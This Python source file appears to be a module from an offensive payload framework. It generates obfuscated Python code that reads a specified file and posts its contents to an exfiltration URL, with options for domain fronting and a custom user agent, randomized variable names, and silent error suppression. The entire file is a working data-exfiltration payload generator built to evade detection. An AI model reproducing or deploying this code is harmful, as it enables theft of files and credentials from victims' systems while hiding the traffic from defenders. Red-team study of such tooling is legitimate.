from payloads.modules.python.common import urllib_callback
from payloads.helpers.string import unique_random_string_set
from payloads.modules.python.common import obfuscate_python_string


class Module:

    def __init__(self, params=[]):

        self.info = {
            'Author': 'Alain Homewood',
            'Description': 'Exfiltrates the contents of a file to a URL in a POST request',
        }

        self.options = {
            'File': {
                'Description': 'The file to read',
                'Required': True,
                'Type': 'text',
                'Value': ''
            },
            'Exfiltration URL': {
                'Description': 'The URL to exfiltrate data to',
                'Required': True,
                'Type': 'url',
                'Value': ''
            },
            'Host Header': {
                'Description': '(Optional) Specify a custom Host header (i.e. for domain fronting)',
                'Required': False,
                'Type': 'text',
                'Value': ''
            },
            'User Agent': {
                'Description': '(Optional) Specify a custom user agent',
                'Required': False,
                'Type': 'text',
                'Value': ''
            },
        }

        for param in params:
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value

    def generate(self):
        random_variables = unique_random_string_set(set_size=2, length_minimum=10, length_maximum=20)
        var_post_data = random_variables[0]
        var_file = random_variables[1]

        code = "import os;"
        code += "{0}=open(os.path.expanduser({1}),'r');".format(var_file,
                                                                obfuscate_python_string(self.options['File']['Value']))
        code += "{0}={1}.read().encode();".format(var_post_data, var_file)
        code += "{0}.close();".format(var_file)
        code += urllib_callback(url=self.options['Exfiltration URL']['Value'],
                                host_header=self.options['Host Header']['Value'],
                                user_agent=self.options['User Agent']['Value'],
                                post_data_variable=var_post_data,
                                try_except_wrap=False)
        code = "try:\n    {0}\nexcept:\n    pass\n".format(code)

        return code
